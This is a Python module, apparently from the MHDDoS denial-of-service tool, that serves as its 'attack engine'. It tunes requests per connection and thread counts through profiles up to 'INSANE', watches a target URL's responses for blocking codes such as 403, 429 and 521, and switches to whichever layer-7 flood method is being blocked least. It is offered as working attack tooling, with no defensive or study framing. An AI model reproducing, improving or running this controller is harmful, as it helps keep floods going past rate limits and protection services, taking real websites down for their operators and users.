"""Adaptive rate control, throttling, attack engine."""

from __future__ import annotations
import threading
import random
import logging
from typing import Dict, List, Optional
from contextlib import suppress

from .utils import Methods

logger = logging.getLogger("MHDDoS")


class AdaptiveRPC:
    """Adaptive requests-per-connection tuner. Grows on success, shrinks on fail."""

    def __init__(self, initial: int = 10):
        self.current = float(initial)
        self.min_rpc = 2
        self.max_rpc = 100
        self.success_streak = 0
        self.fail_streak = 0
        self.lock = threading.Lock()

    def report_success(self):
        with self.lock:
            self.success_streak += 1
            self.fail_streak = 0
            if self.success_streak >= 5:
                self.current = min(self.max_rpc, self.current * 1.3)
                self.success_streak = 0

    def report_fail(self):
        with self.lock:
            self.fail_streak += 1
            self.success_streak = 0
            if self.fail_streak >= 2:
                self.current = max(self.min_rpc, self.current * 0.5)
                self.fail_streak = 0

    def get(self) -> int:
        with self.lock:
            return int(self.current)


class AdaptiveThrottle:
    """Simple throttle: adjust RPC based on HTTP status codes."""

    def __init__(self, initial_rpc: int = 5):
        self.rpc = initial_rpc
        self._lock = threading.Lock()
        self._successes = 0
        self._failures = 0

    def report(self, status: int):
        with self._lock:
            if status in (200, 301, 302):
                self._successes += 1
                if self._successes >= 3:
                    self.rpc = min(100, self.rpc + 2)
                    self._successes = 0
            elif status in (429, 503, 403):
                self._failures += 1
                if self._failures >= 2:
                    self.rpc = max(2, self.rpc - 5)
                    self._failures = 0


class Aggressiveness:
    """Predefined aggressiveness profiles."""

    LOW = {"rpc": 5, "threads": 50, "jitter": (10, 50)}
    MEDIUM = {"rpc": 20, "threads": 200, "jitter": (1, 10)}
    HIGH = {"rpc": 50, "threads": 500, "jitter": (0, 2)}
    INSANE = {"rpc": 100, "threads": 1000, "jitter": (0, 0)}

    PROFILES = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "INSANE": INSANE}


class EnhancedAdaptiveController:
    """Adaptive attack controller that swaps methods, tunes RPC, monitors target health."""

    def __init__(self, target_url: str, methods: Optional[List[str]] = None):
        self.target_url = target_url
        self.all_methods = methods or list(Methods.LAYER7_METHODS)
        self.current_method = random.choice(self.all_methods)
        self._lock = threading.Lock()
        self._method_block_count = {m: 0 for m in self.all_methods}
        self._method_total_count = {m: 0 for m in self.all_methods}
        self.adaptive_rpc = AdaptiveRPC()
        self.active = False

    def record_response(self, method: str, status_code: int):
        with self._lock:
            self._method_total_count[method] = (
                self._method_total_count.get(method, 0) + 1
            )
            if status_code in (403, 429, 503, 521, 522):
                self._method_block_count[method] = (
                    self._method_block_count.get(method, 0) + 1
                )
                self.adaptive_rpc.report_fail()
            else:
                self.adaptive_rpc.report_success()

    def get_best_method(self) -> str:
        with self._lock:
            return min(
                self.all_methods,
                key=lambda m: (
                    self._method_block_count.get(m, 0)
                    / max(self._method_total_count.get(m, 1), 1)
                ),
            )

    def swap_method(self):
        self.current_method = self.get_best_method()
        logger.info(f"[Adaptive] Swapped to method: {self.current_method}")

    def get_rpc(self) -> int:
        return self.adaptive_rpc.get()
